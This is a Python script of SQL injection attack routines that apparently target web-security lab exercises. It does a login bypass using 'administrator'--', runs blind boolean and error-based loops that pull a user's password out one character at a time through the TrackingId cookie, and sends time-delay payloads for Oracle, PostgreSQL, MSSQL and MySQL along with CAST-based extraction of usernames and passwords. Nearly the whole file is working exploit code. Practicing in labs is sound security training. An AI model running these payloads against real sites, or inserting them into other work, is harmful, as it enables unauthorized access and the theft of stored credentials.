
from urllib.parse import quote
import requests
import difflib
from bs4 import BeautifulSoup
import re

session = requests.Session()
CHAR_LIST = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

base_url = 'url'

def post_injection():
    resp = session.get(base_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    payload = {
        'csrf': csrf_token,
        'username': "administrator'--",
        'password': "test"
    }

    response = session.post(base_url, data=payload)

    print(response.status_code)
    print(response.text)
    print(response.url)
    print(response.history)

def simple_sql_injection():
    url_response = session.get(base_url)
    text1 = url_response.text.splitlines()

    sql_injection = "sql injection"
    injection = base_url+sql_injection
    injection_request = session.get(injection)
    text2= injection_request.text.splitlines()

    diff = difflib.ndiff(text1, text2)

    for lines in diff:
        if lines.startswith('+'):
            print(lines)

def show_text():
    url_response = session.get(base_url)
    print(url_response.text)
    print(url_response.cookies)

def payload_inj(lang_pass, username):
    url_response = session.get(base_url)

    tracking_id = url_response.cookies.get("TrackingId")
    session_id = url_response.cookies.get("session")
    res = ""

    for i in range(1, lang_pass + 1):
        for j in CHAR_LIST:
            payload = f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = '{username}'), {i}, 1) = '{j}'--"

            cookies_injection = {
                "TrackingId": payload,
                "session": session_id
            }
            try:
                response = session.get(base_url, cookies=cookies_injection)

                if "Welcome back!" in response.text:
                    res += j
                    print(f"[+] Latter find {i}: {j} | Password: {res}")
                    break

            except requests.exceptions.RequestException as e:
                print(e)

        else:
            print("Can't find a latter")
            break

def blind_error_inj(lang_pass, username):
    url_response = session.get(base_url)

    tracking_id = url_response.cookies.get("TrackingId")
    session_id = url_response.cookies.get("session")
    res = ""

    for i in range(1, lang_pass + 1):
        for j in CHAR_LIST:
            payload = f"{tracking_id}' || (SELECT CASE WHEN SUBSTR(password, {i}, 1) = '{j}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{username}')||'"
            cookies_injection = {
                "TrackingId": payload,
                "session": session_id
            }

            response = session.get(base_url, cookies=cookies_injection)

            if response.status_code == 500:
                res += j
                print(f"[+] Latter find {i}: {j} | Password: {res}")
                break
        else:
            print("Can't find a latter")
            break

def make_payloads(base, delay):
    return {
        "Oracle":          f"{base}'||dbms_pipe.receive_message('', {delay})||'",
        "PostgreSQL":      f"{base}'||(SELECT pg_sleep({delay}))||'",
        "Microsoft SQL":   f"{base}';WAITFOR DELAY '0:0:{delay}'--",
        "MySQL/MariaDB":   f"{base}' AND SLEEP({delay})-- ",
    }

def url_sql_verify(ses, url, delay):
    baseline = ses.get(url)
    print(f"Baseline status: {baseline.status_code}, length: {len(baseline.text)}")

    for db, payload in make_payloads("", delay).items():
        test_url = url + quote(payload, safe='')
        try:
            response = ses.get(test_url, timeout=delay+5)
            elapsed = response.elapsed.total_seconds()
            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
        except Exception as e:
            print(f"{db}: request failed ({e})")

def cookie_sql_verify(ses, url, delay):
    resp = ses.get(url)
    tracking_id = resp.cookies.get("TrackingId")
    session_id = resp.cookies.get("session")

    if tracking_id is None:
        print("Tracking ID not found")
        return

    for db, payload in make_payloads(tracking_id, delay).items():
        cookies_injection = {
            "TrackingId": payload,
            "session": session_id
        }
        try:
            response = ses.get(url, cookies=cookies_injection, timeout=delay+5)
            elapsed = response.elapsed.total_seconds()
            print(f"{db}: Status code: {response.status_code}, length: {len(response.text)}, time elapsed: {elapsed}")
        except Exception as e:
            print(f"{db}: request failed ({e})")

def cast_inj():

    payload_login = "'AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--"
    payload_pass = "'AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--"
    c = (payload_pass, payload_login)

    for i in c:
        cookies = {
            "TrackingId": i
        }
        response = session.get(base_url, cookies=cookies)

        match = re.search(r'invalid input syntax for type integer: "(.*?)"', response.text)

        if match:
            print(f"We found {match.group(1)}")
        else:
            print(f"Nothing found, check the payload or server response")
            print(response.text[:1000])

# def delay_based_inj(lang_pass, username):
#     url_response = session.get(base_url)

if __name__ == "__main__":
    cookie_sql_verify(session, base_url, 5)